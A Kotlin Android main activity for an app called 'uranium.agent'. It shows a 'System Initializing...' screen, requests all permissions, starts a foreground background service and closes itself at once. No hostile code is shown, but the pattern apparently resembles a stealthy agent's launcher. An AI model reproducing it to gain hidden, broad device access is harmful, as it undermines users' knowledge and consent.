package com.uranium.agent

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import com.uranium.agent.util.Permissions

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(android.widget.TextView(this).apply {
            text = "System Initializing..."
            setTextColor(0xFF00FF66.toInt())
            setBackgroundColor(0xFF000000.toInt())
        })

        Permissions.requestAll(this)
        
        val serviceIntent = Intent(this, CoreService::class.java)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        
        finish()
    }
}
